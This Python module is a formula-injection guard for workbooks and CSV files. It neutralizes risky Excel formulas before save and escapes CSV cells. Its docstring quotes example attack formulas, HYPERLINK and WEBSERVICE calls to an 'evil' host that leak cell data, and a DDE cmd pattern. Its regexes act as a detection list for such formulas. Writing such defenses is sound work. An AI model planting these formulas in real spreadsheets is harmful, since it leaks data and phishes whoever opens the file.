"""
shared/xlsx_guard.py - formula-injection guard for every workbook and CSV this repo writes
(security review 09/29/2026).

Text from outside - a vendor's statement, a QBO memo or vendor name, an email subject - is written into
cells. openpyxl treats any string starting with "=" as a FORMULA, so a vendor who puts
=HYPERLINK("http://evil/...","INV 1234") or =WEBSERVICE("http://evil/?"&B5) in a field would plant a live
phishing link or a data-leaking formula in a workbook the office opens.

Three layers, one module:
  1. text(v) / put(ws, row, col, v)  - write outside text as TEXT at the sink (the known sinks use it)
  2. install()                       - wraps openpyxl's Workbook.save: before any workbook is written, every
                                       RISKY formula is turned into plain text and reported on stderr. Runs for
                                       every tool that imports `shared` (shared/__init__.py installs it), so a
                                       sink nobody fixed yet is still covered, and the file still gets built
  3. formula_risk(f)                 - the rule, also used by shared/xlsx_verify as a tripwire on saved files
  csv_cell(v)                        - the CSV version: a string cell starting = + - @ gets a leading '

The rule is calibrated on what our own tools write (scan of their outputs, 09/29/2026): SUMIFS / IFERROR /
IF / SUM / SUMIF / COUNTIFS / ISNUMBER / HYPERLINK... and links only to qbo.intuit.com. So a formula is risky
when it calls the web or runs something (WEBSERVICE, FILTERXML, IMAGE, RTD, CALL, REGISTER, EXEC), uses a
DDE command (cmd|'/c ...'!A0), reaches into another workbook by file ([book.xlsx]), or links to a host
other than Intuit. Plain arithmetic from a vendor stays a harmless formula.
"""
from __future__ import annotations

import re
import sys
from typing import List, Optional, Tuple

_DANGER_FUNCS = re.compile(r"\b(WEBSERVICE|FILTERXML|IMAGE|RTD|CALL|REGISTER(?:\.ID)?|EXEC)\s*\(", re.I)
_DDE = re.compile(r"[A-Za-z0-9_.]+\|\s*'[^']*'\s*!|[A-Za-z0-9_.]+\|\s*\"[^\"]*\"\s*!|\b(?:cmd|msexcel|powershell)\s*\|", re.I)
_EXT_BOOK = re.compile(r"\[[^\]]*\.xl[a-z]{0,2}\]", re.I)
_URL = re.compile(r"(?i)\b(?:https?|ftp|smb|file)://([^/\"'\s,)]*)")
ALLOWED_LINK_DOMAINS = ("intuit.com",)       # qbo.intuit.com / app.qbo.intuit.com - the only link target in use

_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")


def formula_risk(formula: str) -> Optional[str]:
    """Why a formula is risky, or None. `formula` with or without the leading '='."""
    f = formula or ""
    m = _DANGER_FUNCS.search(f)
    if m:
        return f"calls {m.group(1).upper()}"
    if _DDE.search(f):
        return "runs a DDE command"
    if _EXT_BOOK.search(f):
        return "reads another workbook"
    for host in _URL.findall(f):
        h = host.lower().split(":")[0]
        if not any(h == d or h.endswith("." + d) for d in ALLOWED_LINK_DOMAINS):
            return f"links to {h or 'an unknown host'}"
    return None


def text(value):
    """Mark outside text as text. Returns the value unchanged - use put() to force the cell type."""
    return value


def put(ws, row: int, column: int, value):
    """ws.cell(...) for OUTSIDE text: a string is always stored as text, never read as a formula."""
    cell = ws.cell(row=row, column=column, value=value)
    if isinstance(value, str) and cell.data_type == "f":
        cell.data_type = "s"
    return cell


def csv_cell(value):
    """A CSV cell that Excel will not evaluate: a string starting = + - @ (or tab / CR) that is not a plain
    number gets a leading apostrophe."""
    if isinstance(value, str) and value.startswith(_FORMULA_LEAD):
        try:
            float(value.replace(",", ""))
            return value
        except ValueError:
            return "'" + value
    return value


def neutralize(wb) -> List[Tuple[str, str, str]]:
    """Turn every risky formula cell in an in-memory workbook into plain text. [(sheet, cell, reason)]."""
    hits: List[Tuple[str, str, str]] = []
    if getattr(wb, "write_only", False):
        return hits                           # streamed cells cannot be revisited; xlsx_verify still checks
    for ws in getattr(wb, "worksheets", []):
        cells = getattr(ws, "_cells", None)
        if not cells:
            continue
        for cell in cells.values():
            if cell.data_type != "f" or not isinstance(cell.value, str):
                continue
            why = formula_risk(cell.value)
            if why:
                cell.data_type = "s"          # the exact text stays, Excel shows it and never runs it
                hits.append((ws.title, cell.coordinate, why))
    return hits


_installed = False


def install() -> None:
    """Wrap openpyxl's Workbook.save once per process (idempotent; a no-op without openpyxl)."""
    global _installed
    if _installed:
        return
    try:
        from openpyxl.workbook.workbook import Workbook
    except ImportError:
        return
    original = Workbook.save

    def save(self, filename):
        for sheet, coord, why in neutralize(self):
            print(f"!  xlsx_guard: {sheet}!{coord} held a formula that {why} - saved as plain text",
                  file=sys.stderr)
        return original(self, filename)

    save.__doc__ = original.__doc__
    Workbook.save = save
    _installed = True


class _InstallOnImport:
    """Meta-path hook: install() the moment a tool first imports openpyxl's workbook module, so tools that
    never touch Excel pay nothing (importing openpyxl up front costs ~0.16 s)."""
    TARGET = "openpyxl.workbook.workbook"

    def find_spec(self, name, path, target=None):
        if name != self.TARGET:
            return None
        import importlib.machinery
        spec = importlib.machinery.PathFinder.find_spec(name, path)
        if spec is None or spec.loader is None:
            return spec
        run = spec.loader.exec_module

        def exec_module(module):
            run(module)
            install()
        spec.loader.exec_module = exec_module
        return spec


def activate() -> None:
    """Called from shared/__init__.py: guard every workbook this process saves."""
    if "openpyxl.workbook.workbook" in sys.modules:
        install()
    elif not any(isinstance(f, _InstallOnImport) for f in sys.meta_path):
        sys.meta_path.insert(0, _InstallOnImport())
